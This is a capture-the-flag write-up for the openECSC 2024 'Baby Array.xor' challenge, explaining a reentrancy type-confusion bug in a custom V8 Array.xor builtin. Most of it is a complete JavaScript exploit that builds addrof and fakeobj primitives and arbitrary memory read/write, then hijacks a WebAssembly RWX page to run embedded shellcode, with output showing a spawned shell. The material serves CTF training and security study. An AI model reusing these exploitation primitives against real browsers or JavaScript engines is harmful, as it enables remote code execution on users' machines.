# openECSC 2024 - Round 3

## [pwn] Baby Array.xor (6 solves)

In case you need to xor doubles...

`nc arrayxor.challs.open.ecsc2024.it 1337`

Author: Vincenzo Bonforte <@Bonfee>

## Overview

The provided v8 patch introduces a new Array builtin `Array.xor` that can be used to xor `PACKED_DOUBLE_ELEMENTS` arrays.
For example:

```text
d8> a = [0.1, 0.2]
[0.1, 0.2]
d8> a.xor(1)
undefined
d8> a
[0.10000000000000002, 0.20000000000000004]
```

To make the challenge easier the v8 sandbox is disabled.

## Solution

The vulnerability consists in a type confusion caused by a reentrancy in the added builtin:

```cpp
BUILTIN(ArrayXor) {
  HandleScope scope(isolate);
  Factory *factory = isolate->factory();
  Handle<Object> receiver = args.receiver();

  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, JSArray::cast(*receiver))) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Nope")));
  }

  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
  ElementsKind kind = array->GetElementsKind();

  // [1]
  if (kind != PACKED_DOUBLE_ELEMENTS) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Array.xor needs array of double numbers")));
  }

  // Array.xor() needs exactly 1 argument
  if (args.length() != 2) {
    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
      factory->NewStringFromAsciiChecked("Array.xor needs exactly one argument")));
  }

  // Get array len
  uint32_t length = static_cast<uint32_t>(Object::Number(array->length()));

  // Get xor value
  Handle<Object> xor_val_obj;
  // [2]
  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, xor_val_obj, Object::ToNumber(isolate, args.at(1)));
  uint64_t xor_val = static_cast<uint64_t>(Object::Number(*xor_val_obj));

  // Ah yes, xoring doubles..
  // [3]
  Handle<FixedDoubleArray> elements(FixedDoubleArray::cast(array->elements()), isolate);
  FOR_WITH_HANDLE_SCOPE(isolate, uint32_t, i = 0, i, i < length, i++, {
    double x = elements->get_scalar(i);
    uint64_t result = (*(uint64_t*)&x) ^ xor_val;
    elements->set(i, *(double*)&result);
  });
  
  return ReadOnlyRoots(isolate).undefined_value();
}
```

At `[1]` the code checks that the provided array is of type `PACKED_DOUBLE_ELEMENTS`.  
In this case the `elements` pointer of the array simply contains inline doubles.

```text
// a = [0.1, 0.1, 0.1, 0.1, 0.1]
0x15b000042bd0: 0x0000000a000008a9      0x3fb999999999999a
0x15b000042be0: 0x3fb999999999999a      0x3fb999999999999a
0x15b000042bf0: 0x3fb999999999999a      0x3fb999999999999a
```

At `[2]` the argument passed to the builtin is casted to a number, if a javascript object is passed instead of a number then `Object::ToNumber` will call its `valueOf()` method.  
Using this reentrancy it's possible to change the type of the receiver array and switch it to `PACKED_ELEMENTS`.  
With this map the `elements` array now can contains both SMIs and pointers.  

At `[3]` the builtin will continue to assume that the array map hasn't changed.  
Finally, at `[4]`, the elements content will be xored with the value returned by the `valueOf` method.  

Because of how SMIs and ptrs are represented in the V8 heap this vulnerability allows to easily craft `fakeobj` and `addrof` primitives by simply flipping the last bit of an entry in the `elements` array.

## Exploit

```js
const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u64 = new BigUint64Array(conv_ab);

function itof(x) {
    conv_u64[0] = BigInt(x);
    return conv_f64[0];
}

function ftoi(x) {
    conv_f64[0] = x;
    return conv_u64[0];
}

const expl_wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 3, 2, 0, 0, 5, 3, 1, 0, 2, 6, 42, 7, 127, 0, 65, 128, 8, 11, 127, 0, 65, 128, 8, 11, 127, 0, 65, 160, 14, 11, 127, 0, 65, 128, 8, 11, 127, 0, 65, 160, 142, 4, 11, 127, 0, 65, 0, 11, 127, 0, 65, 1, 11, 7, 130, 1, 10, 6, 109, 101, 109, 111, 114, 121, 2, 0, 17, 95, 95, 119, 97, 115, 109, 95, 99, 97, 108, 108, 95, 99, 116, 111, 114, 115, 0, 0, 4, 102, 117, 110, 99, 0, 1, 1, 103, 3, 0, 12, 95, 95, 100, 115, 111, 95, 104, 97, 110, 100, 108, 101, 3, 1, 10, 95, 95, 100, 97, 116, 97, 95, 101, 110, 100, 3, 2, 13, 95, 95, 103, 108, 111, 98, 97, 108, 95, 98, 97, 115, 101, 3, 3, 11, 95, 95, 104, 101, 97, 112, 95, 98, 97, 115, 101, 3, 4, 13, 95, 95, 109, 101, 109, 111, 114, 121, 95, 98, 97, 115, 101, 3, 5, 12, 95, 95, 116, 97, 98, 108, 101, 95, 98, 97, 115, 101, 3, 6, 10, 138, 1, 2, 3, 0, 1, 11, 131, 1, 0, 65, 128, 8, 66, 170, 213, 170, 213, 170, 213, 170, 213, 170, 127, 55, 3, 0, 65, 128, 8, 66, 184, 223, 204, 195, 134, 128, 228, 245, 9, 55, 3, 0, 65, 136, 8, 66, 200, 130, 131, 135, 130, 146, 228, 245, 9, 55, 3, 0, 65, 144, 8, 66, 200, 138, 188, 145, 150, 205, 219, 245, 9, 55, 3, 0, 65, 152, 8, 66, 208, 144, 165, 188, 142, 146, 228, 245, 9, 55, 3, 0, 65, 160, 8, 66, 177, 236, 199, 145, 141, 146, 228, 245, 9, 55, 3, 0, 65, 168, 8, 66, 184, 247, 128, 128, 128, 128, 228, 245, 9, 55, 3, 0, 65, 176, 8, 66, 143, 138, 192, 132, 137, 146, 228, 245, 9, 55, 3, 0, 11, 0, 201, 1, 9, 112, 114, 111, 100, 117, 99, 101, 114, 115, 1, 12, 112, 114, 111, 99, 101, 115, 115, 101, 100, 45, 98, 121, 1, 69, 65, 110, 100, 114, 111, 105, 100, 32, 40, 49, 49, 51, 52, 57, 50, 50, 56, 44, 32, 43, 112, 103, 111, 44, 32, 43, 98, 111, 108, 116, 44, 32, 43, 108, 116, 111, 44, 32, 45, 109, 108, 103, 111, 44, 32, 98, 97, 115, 101, 100, 32, 111, 110, 32, 114, 52, 56, 55, 55, 52, 55, 101, 41, 32, 99, 108, 97, 110, 103, 105, 49, 55, 46, 48, 46, 50, 32, 40, 104, 116, 116, 112, 115, 58, 47, 47, 97, 110, 100, 114, 111, 105, 100, 46, 103, 111, 111, 103, 108, 101, 115, 111, 117, 114, 99, 101, 46, 99, 111, 109, 47, 116, 111, 111, 108, 99, 104, 97, 105, 110, 47, 108, 108, 118, 109, 45, 112, 114, 111, 106, 101, 99, 116, 32, 100, 57, 102, 56, 57, 102, 52, 100, 49, 54, 54, 54, 51, 100, 53, 48, 49, 50, 101, 53, 99, 48, 57, 52, 57, 53, 102, 51, 98, 51, 48, 101, 99, 101, 51, 100, 50, 51, 54, 50, 41, 0, 44, 15, 116, 97, 114, 103, 101, 116, 95, 102, 101, 97, 116, 117, 114, 101, 115, 2, 43, 15, 109, 117, 116, 97, 98, 108, 101, 45, 103, 108, 111, 98, 97, 108, 115, 43, 8, 115, 105, 103, 110, 45, 101, 120, 116]);
let expl_wasm_mod = new WebAssembly.Module(expl_wasm_code);
let expl_wasm_instance = new WebAssembly.Instance(expl_wasm_mod);

const EMPTY_PROPERTIES_ADDR = 0x725n;
const MAP_JSARR_PACKED_DOUBLES_ADDR = 0x1cb7c5n;

let arr_arbrw = [0.1, 0.2, 0.3];

const FAKE_JSARR_SZ = 2n;
let fake_jsarr = [
    itof((EMPTY_PROPERTIES_ADDR << 32n) | MAP_JSARR_PACKED_DOUBLES_ADDR),
    itof(0x4343434343434343n) // PLACEHOLDER
];

const obj1 = {'a': 0x1337};

class Pwn {
    constructor(arr, val, obj) {
        this._arr = arr;
        this._val = val;
        this._obj = obj;
    }
    valueOf() {
        this._arr[0] = this._obj; // Switch array type to PACKED_ELEMENTS
        return this._val;
    }
}

function addrof(obj) {
    let arr = [0.0, 0.1, 0.3];
    arr.xor(new Pwn(arr, 1, obj));
    return 2*arr[0] + 1;
}

function fakeobj(addr, obj) {
    let arr = [0.0, 0.1, 0.3];
    arr.xor(new Pwn(arr, addrof(obj) ^ addr, obj));
    return arr[0];
}

// Leak 1
let OBJ1_ADDR = addrof(obj1);
console.log("addrof(obj1) = 0x" + OBJ1_ADDR.toString(16));

// Leak 2
let FAKE_JSARR = addrof(fake_jsarr);
let FAKE_JSARR_ELEMENTS = FAKE_JSARR + 0x3c + 8;
console.log("addrof(fake_jsarr) = 0x" + FAKE_JSARR.toString(16));
console.log("addrof(fake_jsarr.elements) = 0x" + FAKE_JSARR_ELEMENTS.toString(16));

// Leak 3
let ARR_ARBRW_ADDR = addrof(arr_arbrw);
console.log("addrof(arr_arbrw) = 0x" + ARR_ARBRW_ADDR.toString(16));

fake_jsarr[1] = itof(((FAKE_JSARR_SZ * 2n) << 32n) | BigInt(ARR_ARBRW_ADDR));

let corrupter_arr = fakeobj(FAKE_JSARR_ELEMENTS, obj1);

function v8_write64(where, what) {
    corrupter_arr[0] = itof((0x6n << 32n) | BigInt(where - 8));
    arr_arbrw[0] = itof(what);
}

function v8_read64(where) {
    corrupter_arr[0] = itof((0x6n << 32n) | BigInt(where - 8));
    return ftoi(arr_arbrw[0]);
}

let wasm_instance_addr = addrof(expl_wasm_instance);
let wasm_data_addr = Number(v8_read64(wasm_instance_addr + 12) & 0xffffffffn);
let rwx_page = v8_read64(wasm_data_addr + 0x30);

console.log("wasm instance addr: 0x"+wasm_instance_addr.toString(16));
console.log("wasm data addr: 0x"+wasm_data_addr.toString(16));
console.log("rwx page: 0x"+rwx_page.toString(16));

v8_write64(wasm_data_addr + 0x30, rwx_page + 0x8afn - 5n);

expl_wasm_instance.exports.func();
```

```text
bonfee@vm $ ./d8 exploit.js
addrof(obj1) = 0x44b2d
addrof(fake_jsarr) = 0x44acd
addrof(fake_jsarr.elements) = 0x44b11
addrof(arr_arbrw) = 0x44aad
wasm instance addr: 0x1d4a71
wasm data addr: 0x200419
rwx page: 0x2cafb02ec000
$ whoami
bonfee
$
